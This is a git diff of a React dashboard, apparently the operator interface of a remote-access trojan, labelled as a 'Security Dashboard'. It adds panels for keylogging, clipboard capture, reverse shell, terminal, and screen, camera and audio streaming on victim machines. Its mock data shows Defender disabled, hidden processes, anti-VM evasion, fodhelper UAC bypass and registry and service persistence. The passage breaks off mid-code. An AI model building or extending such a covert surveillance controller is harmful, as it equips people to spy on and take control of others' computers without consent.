@@ -24,6 +24,17 @@ import SecurityControlPanel from "@/components/security/SecurityControlPanel";
 import PersistenceControlPanel from "@/components/persistence/PersistenceControlPanel";
 import MonitoringControlPanel from "@/components/monitoring/MonitoringControlPanel";
 import FileTransferPanel from "@/components/filetransfer/FileTransferPanel";
+import Navigation from "@/components/ui/navigation";
+import TerminalPanel from "@/components/terminal/TerminalPanel";
+import ProcessListPanel from "@/components/processes/ProcessListPanel";
+import SystemInfoPanel from "@/components/system/SystemInfoPanel";
+import NetworkPanel from "@/components/network/NetworkPanel";
+import KeyloggerPanel from "@/components/monitoring/KeyloggerPanel";
+import ClipboardMonitorPanel from "@/components/monitoring/ClipboardMonitorPanel";
+import VoiceControlPanel from "@/components/monitoring/VoiceControlPanel";
+import ReverseShellPanel from "@/components/monitoring/ReverseShellPanel";
+import EnhancedWebRTCPanel from "@/components/streaming/EnhancedWebRTCPanel";
+import EnhancedFileTransferPanel from "@/components/filetransfer/EnhancedFileTransferPanel";
 import type { Agent, DashboardMetrics } from "@/types/dashboard";
 
 // Small helper to update meta for SEO
@@ -81,6 +92,7 @@ const Index = () => {
   const [bypassView, setBypassView] = useState<'persistence' | 'uac'>("persistence");
   const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
   const [activePanel, setActivePanel] = useState<string | null>(null);
+  const [activeView, setActiveView] = useState("overview");
 
   // WebSocket connection for real-time updates
   const { isConnected, lastMessage, sendMessage } = useWebSocket('ws://localhost:8080/ws');
@@ -98,145 +110,160 @@ const Index = () => {
       streams: { screen: true, camera: false, audio: true },
       persistence: { registry: true, startup: true, scheduledTasks: false, services: true },
       security: { defenderDisabled: true, avDisabled: false, processHidden: true, antiVm: true, antiDebug: true },
-      privileges: { admin: true, uacBypassed: true, method: "fodhelper.exe" }
     },
     {
-      id: "agent-002", 
+      id: "agent-002",
       hostname: "LAPTOP-XYZ789",
       ip: "192.168.1.101",
-      os: "Windows 10 Home",
-      status: "offline",
-      lastSeen: "2024-01-15T13:20:00Z",
-      capabilities: ["screen", "keylogger"],
+      os: "Windows 10 Pro",
+      status: "online",
+      lastSeen: "2024-01-15T14:34:30Z",
+      capabilities: ["screen", "audio", "keylogger"],
       streams: { screen: false, camera: false, audio: false },
       persistence: { registry: false, startup: true, scheduledTasks: true, services: false },
-      security: { defenderDisabled: false, avDisabled: false, processHidden: false, antiVm: false, antiDebug: false },
-      privileges: { admin: false, uacBypassed: false, method: "" }
-    }
-  ]);
-
-  // Mock file transfers
-  const [fileTransfers, setFileTransfers] = useState([
-    {
-      id: "transfer-001",
-      filename: "passwords.txt",
-      size: 1024000,
-      progress: 75,
-      direction: "download" as const,
-      status: "active" as const,
-      speed: 102400
+      security: { defenderDisabled: false, avDisabled: true, processHidden: false, antiVm: false, antiDebug: true },
     },
     {
-      id: "transfer-002", 
-      filename: "screenshot.png",
-      size: 2048000,
-      progress: 100,
-      direction: "upload" as const,
-      status: "completed" as const,
-      speed: 0
-    }
+      id: "agent-003",
+      hostname: "SERVER-DEF456",
+      ip: "192.168.1.102",
+      os: "Windows Server 2022",
+      status: "offline",
+      lastSeen: "2024-01-15T13:45:00Z",
+      capabilities: ["screen", "camera", "audio", "keylogger", "clipboard"],
+      streams: { screen: false, camera: false, audio: false },
+      persistence: { registry: true, startup: false, scheduledTasks: true, services: true },
+      security: { defenderDisabled: true, avDisabled: true, processHidden: true, antiVm: true, antiDebug: true },
+    },
   ]);
 
+  // File transfer data
+  const [fileTransfers, setFileTransfers] = useState([
+    {
+      id: "1",
+      filename: "document.pdf",
+      size: 2048576,
+      progress: 75,
+      status: "uploading" as const,
+      agentId: "agent-001",
+      startTime: "2024-01-15T14:30:00Z",
+    },
+    {
+      id: "2", 
+      filename: "screenshot.png",
+      size: 1024000,
+      progress: 100,
+      status: "completed" as const,
+      agentId: "agent-002",
+      startTime: "2024-01-15T14:25:00Z",
+    },
+  ]);
+
+  // SEO setup
   useEffect(() => {
-    document.title = "Ghost Stream Control – Security Dashboard";
+    document.title = "Neural Control Hub – Security Dashboard";
     setMeta("description", "Realtime security, streaming and controller status dashboard with interactive charts.");
   }, []);
 
-  // Handle WebSocket messages
+  // WebSocket message handling
   useEffect(() => {
     if (lastMessage) {
-      console.log('Received WebSocket message:', lastMessage);
-      // Handle different message types
-      switch (lastMessage.type) {
-        case 'agent_update':
-          setAgents(prev => prev.map(agent => 
-            agent.id === lastMessage.data.id ? { ...agent, ...lastMessage.data } : agent
-          ));
-          break;
-        case 'metrics_update':
-          // Update dashboard metrics
-          break;
+      try {
+        const data = JSON.parse(lastMessage);
+        // Handle different message types
+        console.log("WebSocket message:", data);
+      } catch (e) {
+        console.error("Error parsing WebSocket message:", e);
       }
     }
   }, [lastMessage]);
 
   // Agent control handlers
-  const handleStreamToggle = (agentId: string, type: 'screen' | 'camera' | 'audio', action: 'start' | 'stop') => {
-    sendMessage({
+  const handleStreamToggle = (agentId: string, type: string, action: string) => {
+    sendMessage(JSON.stringify({
       type: 'stream_control',
-      data: { agentId, streamType: type, action }
-    });
+      agent_id: agentId,
+      stream_type: type,
+      action: action
+    }));
   };
 
   const handleSecurityAction = (agentId: string, action: string, params?: any) => {
-    sendMessage({
+    sendMessage(JSON.stringify({
       type: 'security_control',
-      data: { agentId, action, params }
-    });
+      agent_id: agentId,
+      action: action,
+      params: params
+    }));
   };
 
   const handlePersistenceAction = (agentId: string, method: string, action: string, params?: any) => {
-    sendMessage({
+    sendMessage(JSON.stringify({
       type: 'persistence_control',
-      data: { agentId, method, action, params }
-    });
+      agent_id: agentId,
+      method: method,
+      action: action,
+      params: params
+    }));
   };
 
   const handleMonitoringAction = (agentId: string, type: string, action: string, params?: any) => {
-    sendMessage({
+    sendMessage(JSON.stringify({
       type: 'monitoring_control',
-      data: { agentId, type, action, params }
-    });
+      agent_id: agentId,
+      monitor_type: type,
+      action: action,
+      params: params
+    }));
   };
 
   const handleFileAction = (agentId: string, action: string, params?: any) => {
-    sendMessage({
+    sendMessage(JSON.stringify({
       type: 'file_control',
-      data: { agentId, action, params }
-    });
+      agent_id: agentId,
+      action: action,
+      params: params
+    }));
   };
 
-  // Overview donut datasets
-  const agentReport = useMemo(() => (
-    [
-      { name: "Problems", value: agents.filter(a => a.status === 'offline').length },
-      { name: "Errors", value: agents.filter(a => !a.security.defenderDisabled && a.status === 'online').length },
-      { name: "Bugs", value: agents.filter(a => !a.privileges.admin && a.status === 'online').length },
-    ]
-  ), []);
+  // Computed metrics
+  const onlineAgents = agents.filter(agent => agent.status === 'online');
+  const totalAgents = agents.length;
 
-  const connectionStatus = useMemo(() => (
-    [
-      { name: "Connected", value: agents.filter(a => a.status === 'online').length },
-      { name: "Offline", value: agents.filter(a => a.status === 'offline').length },
-    ]
-  ), [agents]);
+  // Chart data
+  const agentReport = useMemo(() => [
+    { label: "Critical", value: 8, color: "hsl(var(--chart-1))" },
+    { label: "Warning", value: 15, color: "hsl(var(--chart-2))" },
+    { label: "Info", value: 7, color: "hsl(var(--chart-3))" },
+  ], []);
 
-  const persistenceMethods = useMemo(() => (
-    [
-      { name: "Registry Keys", value: agents.filter(a => a.persistence.registry).length },
-      { name: "Startup Entries", value: agents.filter(a => a.persistence.startup).length },
-      { name: "Scheduled Tasks", value: agents.filter(a => a.persistence.scheduledTasks).length },
-    ]
-  ), [agents]);
+  const connectionStatus = useMemo(() => [
+    { label: "Online", value: onlineAgents.length, color: "hsl(var(--chart-1))" },
+    { label: "Recently Active", value: 1, color: "hsl(var(--chart-2))" },
+    { label: "Offline", value: totalAgents - onlineAgents.length - 1, color: "hsl(var(--chart-3))" },
+  ], [onlineAgents.length, totalAgents]);
 
-  const uacBypass = useMemo(() => (
-    [
-      { name: "EventVwr.exe Hijacking", value: agents.filter(a => a.privileges.method === 'EventVwr.exe').length },
-      { name: "sdclt.exe Bypass", value: agents.filter(a => a.privileges.method === 'sdclt.exe').length },
-      { name: "fodhelper.exe", value: agents.filter(a => a.privileges.method === 'fodhelper.exe').length },
-    ]
-  ), [agents]);
+  const persistenceMethods = useMemo(() => [
+    { label: "Registry", value: 3, color: "hsl(var(--chart-1))" },
+    { label: "Startup", value: 2, color: "hsl(var(--chart-2))" },
+    { label: "Services", value: 2, color: "hsl(var(--chart-3))" },
+    { label: "Tasks", value: 1, color: "hsl(var(--chart-4))" },
+  ], []);
 
-  // Trending line data (mocked)
-  const [trendData, setTrendData] = useState(() =>
-    Array.from({ length: 15 }).map((_, i) => ({
-      name: `${i + 1}`,
-      Security: Math.max(15, Math.min(95, 10 + i * 5)),
-      Identity: Math.max(10, Math.min(98, 5 + i * 6)),
-      Network: Math.max(5, Math.min(90, 3 + i * 4)),
-      Service: Math.max(8, Math.min(92, 6 + i * 5)),
-    }))
+  const uacBypass = useMemo(() => [
+    { label: "Success", value: 4, color: "hsl(var(--chart-1))" },
+    { label: "Failed", value: 2, color: "hsl(var(--chart-2))" },
+    { label: "Pending", value: 1, color: "hsl(var(--chart-3))" },
+  ], []);
+
+  const trendData = useMemo(() => 
+    Array.from({ length: 30 }).map((_, i) => ({
+      name: `Day ${i + 1}`,
+      Security: Math.floor(Math.random() * 40) + 60,
+      Identity: Math.floor(Math.random() * 30) + 70,
+      Network: Math.floor(Math.random() * 25) + 75,
+      Service: Math.floor(Math.random() * 20) + 80,
+    })), []
   );
 
   // Controller realtime metrics
@@ -284,358 +311,434 @@ const Index = () => {
     </div>
   );
 
-  return (
-    <main className="min-h-screen bg-background">
-      <header className="sticky top-0 z-40 backdrop-blur supports-[backdrop-filter]:bg-background/70 border-b">
-        <div className="container py-4 flex flex-col gap-4">
-          <div className="flex items-center justify-between">
-            <h1 className="text-2xl font-semibold">Security Operations Dashboard</h1>
-            <div className="hidden md:flex items-center gap-2">
-              <Button variant="secondary" className="animate-glow">Overview</Button>
-              <DropdownMenu>
-                <DropdownMenuTrigger asChild>
-                  <Button variant="secondary" className="animate-glow">Category</Button>
-                </DropdownMenuTrigger>
-                <DropdownMenuContent className="z-50 bg-popover">
-                  <DropdownMenuLabel>Categories</DropdownMenuLabel>
-                  <DropdownMenuRadioGroup value={category} onValueChange={setCategory}>
-                    {categories.map((c) => (
-                      <DropdownMenuRadioItem key={c.key} value={c.key}>
-                        {c.label}
-                      </DropdownMenuRadioItem>
-                    ))}
-                  </DropdownMenuRadioGroup>
-                  <Separator className="my-2" />
-                  {filterPreviewDonut}
-                  <Separator className="my-2" />
-                  {filterPreviewLine}
-                </DropdownMenuContent>
-              </DropdownMenu>
+  const handleLogout = () => {
+    window.location.href = '/logout';
+  };
 
-              <DropdownMenu>
-                <DropdownMenuTrigger asChild>
-                  <Button variant="secondary" className="animate-glow">Checks</Button>
-                </DropdownMenuTrigger>
-                <DropdownMenuContent className="z-50 bg-popover">
-                  <DropdownMenuLabel>Checks</DropdownMenuLabel>
-                  <DropdownMenuRadioGroup value={check} onValueChange={setCheck}>
-                    {checks.map((c) => (
-                      <DropdownMenuRadioItem key={c.key} value={c.key}>
-                        {c.label}
-                      </DropdownMenuRadioItem>
-                    ))}
-                  </DropdownMenuRadioGroup>
-                  <Separator className="my-2" />
-                  {filterPreviewDonut}
-                  <Separator className="my-2" />
-                  {filterPreviewLine}
-                </DropdownMenuContent>
-              </DropdownMenu>
+  const renderOverviewDashboard = () => (
+    <section className="container mx-auto p-6 space-y-8">
+      <FilterToolbar
+        category={category}
+        setCategory={setCategory}
+        check={check}
+        setCheck={setCheck}
+        range={range}
+        setRange={setRange}
+        categories={categories}
+        checks={checks}
+        ranges={ranges}
+      />
 
-              <DropdownMenu>
-                <DropdownMenuTrigger asChild>
-                  <Button variant="secondary" className="animate-glow">Time Range</Button>
-                </DropdownMenuTrigger>
-                <DropdownMenuContent className="z-50 bg-popover">
-                  <DropdownMenuLabel>Log & Activity Filters</DropdownMenuLabel>
-                  <DropdownMenuRadioGroup value={range} onValueChange={setRange}>
-                    {ranges.map((r) => (
-                      <DropdownMenuRadioItem key={r.key} value={r.key}>
-                        {r.label}
-                      </DropdownMenuRadioItem>
-                    ))}
-                  </DropdownMenuRadioGroup>
-                  <Separator className="my-2" />
-                  {filterPreviewDonut}
-                  <Separator className="my-2" />
-                  {filterPreviewLine}
-                </DropdownMenuContent>
-              </DropdownMenu>
-            </div>
-          </div>
-
-          <p className="text-sm text-muted-foreground">
-            {categories.find((c) => c.key === category)?.description}
-          </p>
-          <FilterToolbar category={category} check={check} range={range} />
-        </div>
-      </header>
-
-      <section className="container py-6 grid gap-6">
-        <div className="grid gap-6 md:grid-cols-12">
-          <div className="md:col-span-12 lg:col-span-3">
-            <Card className="h-full">
-              <CardHeader>
-                <CardTitle className="flex items-center justify-between">
-                  Active Agents
-                  <Badge variant={isConnected ? "default" : "destructive"}>
-                    {isConnected ? "Connected" : "Disconnected"}
-                  </Badge>
-                </CardTitle>
-              </CardHeader>
-              <CardContent className="space-y-4">
-                {agents.length === 0 ? (
-                  <div className="rounded-lg border border-border bg-muted/20 p-6 text-center text-sm text-muted-foreground">
-                    No agents connected
-                  </div>
-                ) : (
-                  <div className="space-y-2">
-                    {agents.map((agent) => (
-                      <div key={agent.id} className="flex items-center justify-between p-2 border rounded">
-                        <div className="space-y-1">
-                          <div className="flex items-center gap-2">
-                            <div className={`w-2 h-2 rounded-full ${agent.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`} />
-                            <span className="font-medium text-sm">{agent.hostname}</span>
-                          </div>
-                          <div className="text-xs text-muted-foreground">{agent.ip} • {agent.os}</div>
-                        </div>
-                        <Button
-                          variant="outline"
-                          size="sm"
-                          onClick={() => {
-                            setSelectedAgent(agent.id);
-                            setActivePanel('streaming');
-                          }}
-                          disabled={agent.status !== 'online'}
-                        >
-                          Control
-                        </Button>
-                      </div>
-                    ))}
-                  </div>
-                )}
-                <div className="grid gap-2">
-                  <Button
-                    variant="secondary"
-                    className="justify-start font-medium"
-                    style={{ backgroundImage: "var(--gradient-primary)" }}
-                    onClick={() => setActivePanel('overview')}
-                  >
-                    Agent Stats
-                  </Button>
-                  <Button 
-                    variant="secondary" 
-                    className="justify-start bg-muted/30"
-                    onClick={() => setActivePanel('health')}
-                  >
-                    System Health
-                  </Button>
-                  <Button 
-                    variant="secondary" 
-                    className="justify-start bg-muted/30"
-                    onClick={() => setActivePanel('processes')}
-                  >
-                    List Processes
-                  </Button>
-                  <Button 
-                    variant="secondary" 
-                    className="justify-start bg-muted/30"
-                    onClick={() => window.location.reload()}
-                  >
-                    Refresh Dashboard
-                  </Button>
+      <div className="grid gap-6 md:grid-cols-12">
+        <div className="md:col-span-12 lg:col-span-3">
+          <Card className="h-full">
+            <CardHeader>
+              <CardTitle className="flex items-center justify-between">
+                Active Agents
+                <Badge variant={isConnected ? "default" : "destructive"}>
+                  {isConnected ? "Connected" : "Disconnected"}
+                </Badge>
+              </CardTitle>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              {agents.length === 0 ? (
+                <div className="rounded-lg border border-border bg-muted/20 p-6 text-center text-sm text-muted-foreground">
+                  No agents connected
                 </div>
-                <Separator />
-              </CardContent>
-            </Card>
-          </div>
-
-          <Card className="relative md:col-span-6 lg:col-span-3">
-            <CardHeader>
-              <CardTitle>Agent Report Status</CardTitle>
-            </CardHeader>
-            <CardContent>
-              <DoughnutChart data={agentReport} totalLabel="Total Issues" />
-            </CardContent>
-          </Card>
-
-          <Card className="md:col-span-6 lg:col-span-3">
-            <CardHeader>
-              <CardTitle>Agent Connection Status</CardTitle>
-            </CardHeader>
-            <CardContent>
-              <DoughnutChart data={connectionStatus} totalLabel="Total Agents" />
-            </CardContent>
-          </Card>
-
-          <Card className="md:col-span-12 lg:col-span-3">
-            <CardHeader>
-              <CardTitle>Bypass Status</CardTitle>
-            </CardHeader>
-            <CardContent>
-              <Tabs value={bypassView} onValueChange={(v) => setBypassView(v as any)}>
-                <TabsList className="grid w-full grid-cols-2 mb-4">
-                  <TabsTrigger value="persistence">Persistence Methods</TabsTrigger>
-                  <TabsTrigger value="uac">UAC Bypass Methods</TabsTrigger>
-                </TabsList>
-                <TabsContent value="persistence" className="mt-0">
-                  <DoughnutChart data={persistenceMethods} totalLabel="Active Methods" />
-                </TabsContent>
-                <TabsContent value="uac" className="mt-0">
-                  <DoughnutChart data={uacBypass} totalLabel="Attempts" />
-                </TabsContent>
-              </Tabs>
+              ) : (
+                <div className="space-y-2">
+                  {agents.map((agent) => (
+                    <div key={agent.id} className="flex items-center justify-between p-2 border rounded">
+                      <div className="space-y-1">
+                        <div className="flex items-center gap-2">
+                          <div className={`w-2 h-2 rounded-full ${agent.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`} />
+                          <span className="font-medium text-sm">{agent.hostname}</span>
+                        </div>
+                        <div className="text-xs text-muted-foreground">{agent.ip} • {agent.os}</div>
+                      </div>
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        onClick={() => {
+                          setSelectedAgent(agent.id);
+                          setActiveView('streaming');
+                        }}
+                        disabled={agent.status !== 'online'}
+                      >
+                        Control
+                      </Button>
+                    </div>
+                  ))}
+                </div>
+              )}
+              <div className="grid gap-2">
+                <Button
+                  variant="secondary"
+                  className="justify-start font-medium"
+                  style={{ backgroundImage: "var(--gradient-primary)" }}
+                  onClick={() => setActiveView('system-info')}
+                >
+                  Agent Stats
+                </Button>
+                <Button 
+                  variant="secondary" 
+                  className="justify-start bg-muted/30"
+                  onClick={() => setActiveView('network')}
+                >
+                  System Health
+                </Button>
+                <Button 
+                  variant="secondary" 
+                  className="justify-start bg-muted/30"
+                  onClick={() => setActiveView('processes')}
+                >
+                  List Processes
+                </Button>
+                <Button 
+                  variant="secondary" 
+                  className="justify-start bg-muted/30"
+                  onClick={() => window.location.reload()}
+                >
+                  Refresh Dashboard
+                </Button>
+              </div>
+              <Separator />
             </CardContent>
           </Card>
         </div>
 
-        <Card>
+        <Card className="relative md:col-span-6 lg:col-span-3">
           <CardHeader>
-            <CardTitle>Best Practice Checks Trending</CardTitle>
+            <CardTitle>Agent Report Status</CardTitle>
+          </CardHeader>
+          <CardContent>
+            <DoughnutChart data={agentReport} totalLabel="Total Issues" />
+          </CardContent>
+        </Card>
+
+        <Card className="md:col-span-6 lg:col-span-3">
+          <CardHeader>
+            <CardTitle>Agent Connection Status</CardTitle>
+          </CardHeader>
+          <CardContent>
+            <DoughnutChart data={connectionStatus} totalLabel="Total Agents" />
+          </CardContent>
+        </Card>
+
+        <Card className="md:col-span-12 lg:col-span-3">
+          <CardHeader>
+            <CardTitle>Bypass Status</CardTitle>
+          </CardHeader>
+          <CardContent>
+            <Tabs value={bypassView} onValueChange={(v) => setBypassView(v as any)}>
+              <TabsList className="grid w-full grid-cols-2 mb-4">
+                <TabsTrigger value="persistence">Persistence Methods</TabsTrigger>
+                <TabsTrigger value="uac">UAC Bypass Methods</TabsTrigger>
+              </TabsList>
+              <TabsContent value="persistence" className="mt-0">
+                <DoughnutChart data={persistenceMethods} totalLabel="Active Methods" />
+              </TabsContent>
+              <TabsContent value="uac" className="mt-0">
+                <DoughnutChart data={uacBypass} totalLabel="Attempts" />
+              </TabsContent>
+            </Tabs>
+          </CardContent>
+        </Card>
+      </div>
+
+      <Card>
+        <CardHeader>
+          <CardTitle>Best Practice Checks Trending</CardTitle>
+        </CardHeader>
+        <CardContent>
+          <TrendLineChart
+            data={trendData}
+            series={[
+              { dataKey: "Security", name: "Security", colorIndex: 0 },
+              { dataKey: "Identity", name: "Identity", colorIndex: 1 },
+              { dataKey: "Network", name: "Network", colorIndex: 2 },
+              { dataKey: "Service", name: "Service Setup", colorIndex: 3 },
+            ]}
+          />
+        </CardContent>
+      </Card>
+
+      <div className="grid gap-6 md:grid-cols-12">
+        <Card className="md:col-span-12 lg:col-span-9">
+          <CardHeader>
+            <CardTitle>Controller Status (Realtime)</CardTitle>
           </CardHeader>
           <CardContent>
             <TrendLineChart
-              data={trendData}
+              data={controllerData}
               series={[
-                { dataKey: "Security", name: "Security", colorIndex: 0 },
-                { dataKey: "Identity", name: "Identity", colorIndex: 1 },
-                { dataKey: "Network", name: "Network", colorIndex: 2 },
-                { dataKey: "Service", name: "Service Setup", colorIndex: 3 },
+                { dataKey: "Latency", name: "Latency (ms)", colorIndex: 0 },
+                { dataKey: "Agents", name: "Online Agents", colorIndex: 1 },
+                { dataKey: "Service", name: "Service Health %", colorIndex: 3 },
               ]}
             />
           </CardContent>
         </Card>
+        <div className="md:col-span-12 lg:col-span-3 grid gap-6">
+          <ConfigStatusCard />
+          <PasswordManagementCard />
+        </div>
+      </div>
+    </section>
+  );
 
-        <div className="grid gap-6 md:grid-cols-12">
-          <Card className="md:col-span-12 lg:col-span-9">
+  const renderAgentManagement = () => (
+    <section className="container mx-auto p-6 space-y-6">
+      <div className="grid gap-6 md:grid-cols-12">
+        <div className="md:col-span-12">
+          <Card>
             <CardHeader>
-              <CardTitle>Controller Status (Realtime)</CardTitle>
+              <CardTitle>Agent Management</CardTitle>
             </CardHeader>
-            <CardContent>
-              <TrendLineChart
-                data={controllerData}
-                series={[
-                  { dataKey: "Latency", name: "Latency (ms)", colorIndex: 0 },
-                  { dataKey: "Agents", name: "Online Agents", colorIndex: 1 },
-                  { dataKey: "Service", name: "Service Health %", colorIndex: 3 },
-                ]}
-              />
+            <CardContent className="space-y-4">
+              <div className="grid gap-4">
+                {agents.map((agent) => (
+                  <div key={agent.id} className="flex items-center justify-between p-4 border rounded-lg">
+                    <div className="flex items-center gap-4">
+                      <div className={`w-3 h-3 rounded-full ${agent.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`} />
+                      <div>
+                        <div className="font-medium">{agent.hostname}</div>
+                        <div className="text-sm text-muted-foreground">{agent.ip} • {agent.os}</div>
+                        <div className="text-xs text-muted-foreground">Last seen: {new Date(agent.lastSeen).toLocaleString()}</div>
+                      </div>
+                    </div>
+                    <div className="flex items-center gap-2">
+                      <div className="flex gap-1">
+                        {agent.capabilities.map((cap) => (
+                          <Badge key={cap} variant="secondary" className="text-xs">
+                            {cap}
+                          </Badge>
+                        ))}
+                      </div>
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        onClick={() => {
+                          setSelectedAgent(agent.id);
+                          setActiveView('streaming');
+                        }}
+                        disabled={agent.status !== 'online'}
+                      >
+                        Control
+                      </Button>
+                    </div>
+                  </div>
+                ))}
+              </div>
             </CardContent>
           </Card>
-          <div className="md:col-span-12 lg:col-span-3 grid gap-6">
-            <ConfigStatusCard />
-            <PasswordManagementCard />
-          </div>
         </div>
+      </div>
+    </section>
+  );
 
-        {/* Agent Control Panels */}
-        {selectedAgent && activePanel && (
-          <div className="space-y-6">
-            <div className="flex items-center justify-between">
-              <h2 className="text-xl font-semibold">
-                Agent Control - {agents.find(a => a.id === selectedAgent)?.hostname}
-              </h2>
-              <div className="flex gap-2">
-                <Button
-                  variant={activePanel === 'streaming' ? 'default' : 'outline'}
-                  size="sm"
-                  onClick={() => setActivePanel('streaming')}
-                >
-                  Streaming
-                </Button>
-                <Button
-                  variant={activePanel === 'security' ? 'default' : 'outline'}
-                  size="sm"
-                  onClick={() => setActivePanel('security')}
-                >
-                  Security
-                </Button>
-                <Button
-                  variant={activePanel === 'persistence' ? 'default' : 'outline'}
-                  size="sm"
-                  onClick={() => setActivePanel('persistence')}
-                >
-                  Persistence
-                </Button>
-                <Button
-                  variant={activePanel === 'monitoring' ? 'default' : 'outline'}
-                  size="sm"
-                  onClick={() => setActivePanel('monitoring')}
-                >
-                  Monitoring
-                </Button>
-                <Button
-                  variant={activePanel === 'files' ? 'default' : 'outline'}
-                  size="sm"
-                  onClick={() => setActivePanel('files')}
-                >
-                  Files
-                </Button>
-                <Button
-                  variant="ghost"
-                  size="sm"
-                  onClick={() => {
-                    setSelectedAgent(null);
-                    setActivePanel(null);
-                  }}
-                >
-                  Close
-                </Button>
-              </div>
-            </div>
+  const renderStreamingControls = () => (
+    <section className="container mx-auto p-6">
+      {selectedAgent ? (
+        <StreamingControlPanel
+          agentId={selectedAgent}
+          streams={{
+            screen: { active: true, bitrate: 2500, fps: 30, resolution: "1920x1080" },
+            camera: { active: false, bitrate: 0, fps: 0, resolution: "640x480" },
+            audio: { active: true, bitrate: 128, sampleRate: 44100 }
+          }}
+          onStreamToggle={(type, action) => handleStreamToggle(selectedAgent, type, action)}
+        />
+      ) : (
+        <Card>
+          <CardContent className="p-8 text-center">
+            <p className="text-muted-foreground">Please select an agent to control streaming</p>
+          </CardContent>
+        </Card>
+      )}
+    </section>
+  );
 
-            {activePanel === 'streaming' && selectedAgent && (
-              <StreamingControlPanel
-                agentId={selectedAgent}
-                streams={{
-                  screen: { active: true, bitrate: 2500, fps: 30, resolution: "1920x1080" },
-                  camera: { active: false, bitrate: 0, fps: 0, resolution: "640x480" },
-                  audio: { active: true, bitrate: 128, sampleRate: 44100 }
-                }}
-                onStreamToggle={(type, action) => handleStreamToggle(selectedAgent, type, action)}
-              />
-            )}
+  const renderSecurityControls = () => (
+    <section className="container mx-auto p-6">
+      {selectedAgent ? (
+        <SecurityControlPanel
+          agentId={selectedAgent}
+          security={agents.find(a => a.id === selectedAgent)?.security || {
+            defenderDisabled: false,
+            avDisabled: false,
+            processHidden: false,
+            antiVm: false,
+            antiDebug: false
+          }}
+          onSecurityAction={(action, params) => handleSecurityAction(selectedAgent, action, params)}
+        />
+      ) : (
+        <Card>
+          <CardContent className="p-8 text-center">
+            <p className="text-muted-foreground">Please select an agent to control security features</p>
+          </CardContent>
+        </Card>
+      )}
+    </section>
+  );
 
-            {activePanel === 'security' && selectedAgent && (
-              <SecurityControlPanel
-                agentId={selectedAgent}
-                security={agents.find(a => a.id === selectedAgent)?.security || {
-                  defenderDisabled: false,
-                  avDisabled: false,
-                  processHidden: false,
-                  antiVm: false,
-                  antiDebug: false
-                }}
-                onSecurityAction={(action, params) => handleSecurityAction(selectedAgent, action, params)}
-              />
-            )}
+  const renderPersistenceControls = () => (
+    <section className="container mx-auto p-6">
+      {selectedAgent ? (
+        <PersistenceControlPanel
+          agentId={selectedAgent}
+          persistence={{
+            registry: { active: true, count: 3, entries: ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Agent"] },
+            startup: { active: true, count: 1, entries: ["C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\agent.exe"] },
+            scheduledTasks: { active: false, count: 0, entries: [] },
+            services: { active: true, count: 1, entries: ["GhostService"] }
+          }}
+          onPersistenceAction={(method, action, params) => handlePersistenceAction(selectedAgent, method, action, params)}
+        />
+      ) : (
+        <Card>
+          <CardContent className="p-8 text-center">
+            <p className="text-muted-foreground">Please select an agent to control persistence methods</p>
+          </CardContent>
+        </Card>
+      )}
+    </section>
+  );
 
-            {activePanel === 'persistence' && selectedAgent && (
-              <PersistenceControlPanel
-                agentId={selectedAgent}
-                persistence={{
-                  registry: { active: true, count: 3, entries: ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Agent"] },
-                  startup: { active: true, count: 1, entries: ["C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\agent.exe"] },
-                  scheduledTasks: { active: false, count: 0, entries: [] },
-                  services: { active: true, count: 1, entries: ["GhostService"] }
-                }}
-                onPersistenceAction={(method, action, params) => handlePersistenceAction(selectedAgent, method, action, params)}
-              />
-            )}
+  const renderMonitoringControls = () => (
+    <section className="container mx-auto p-6">
+      {selectedAgent ? (
+        <MonitoringControlPanel
+          agentId={selectedAgent}
+          monitoring={{
+            keylogger: { active: true, keyCount: 1247, lastActivity: "2024-01-15T14:35:20Z" },
+            clipboard: { active: true, clipCount: 23, lastClipboard: "https://example.com/secret" },
+            reverseShell: { active: false, commandCount: 0, lastCommand: "" },
+            voiceControl: { active: false, commandCount: 0, lastCommand: "" }
+          }}
+          onMonitoringAction={(type, action, params) => handleMonitoringAction(selectedAgent, type, action, params)}
+        />
+      ) : (
+        <Card>
+          <CardContent className="p-8 text-center">
+            <p className="text-muted-foreground">Please select an agent to control monitoring features</p>
+          </CardContent>
+        </Card>
+      )}
+    </section>
+  );
 
-            {activePanel === 'monitoring' && selectedAgent && (
-              <MonitoringControlPanel
-                agentId={selectedAgent}
-                monitoring={{
-                  keylogger: { active: true, keyCount: 1247, lastActivity: "2024-01-15T14:35:20Z" },
-                  clipboard: { active: true, clipCount: 23, lastClipboard: "https://example.com/secret" },
-                  reverseShell: { active: false, commandCount: 0, lastCommand: "" },
-                  voiceControl: { active: false, commandCount: 0, lastCommand: "" }
-                }}
-                onMonitoringAction={(type, action, params) => handleMonitoringAction(selectedAgent, type, action, params)}
-              />
-            )}
+  const renderFileTransfer = () => (
+    <section className="container mx-auto p-6">
+      {selectedAgent ? (
+        <FileTransferPanel
+          agentId={selectedAgent}
+          transfers={fileTransfers}
+          onFileAction={(action, params) => handleFileAction(selectedAgent, action, params)}
+        />
+      ) : (
+        <Card>
+          <CardContent className="p-8 text-center">
+            <p className="text-muted-foreground">Please select an agent to manage file transfers</p>
+          </CardContent>
+        </Card>
+      )}
+    </section>
+  );
 
-            {activePanel === 'files' && selectedAgent && (
-              <FileTransferPanel
-                agentId={selectedAgent}
-                transfers={fileTransfers}
-                onFileAction={(action, params) => handleFileAction(selectedAgent, action, params)}
-              />
-            )}
-          </div>
-        )}
-      </section>
+  const renderActiveView = () => {
+    switch (activeView) {
+      case "overview":
+        return renderOverviewDashboard();
+      case "agents":
+        return renderAgentManagement();
+      case "terminal":
+        return (
+          <section className="container mx-auto p-6">
+            <TerminalPanel agentId={selectedAgent} />
+          </section>
+        );
+      case "processes":
+        return (
+          <section className="container mx-auto p-6">
+            <ProcessListPanel agentId={selectedAgent} />
+          </section>
+        );
+      case "system-info":
+        return (
